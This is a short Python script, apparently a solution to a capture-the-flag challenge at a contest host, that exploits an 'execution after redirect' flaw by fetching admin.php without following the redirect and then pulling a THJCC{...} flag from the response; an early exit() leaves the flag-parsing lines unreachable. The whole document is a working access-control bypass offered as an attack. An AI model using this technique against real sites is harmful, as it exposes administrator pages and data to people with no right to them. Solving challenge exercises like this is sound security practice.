import requests
import re

url = "http://chal.thjcc.org:1234/"

# execution after redirect  -> admin.php
res = requests.get(f'{url}/admin.php', allow_redirects=False)

print(res.text)
exit()
flag = re.findall(r'(THJCC{.+})', res.text)[0]
print("Flag:", flag)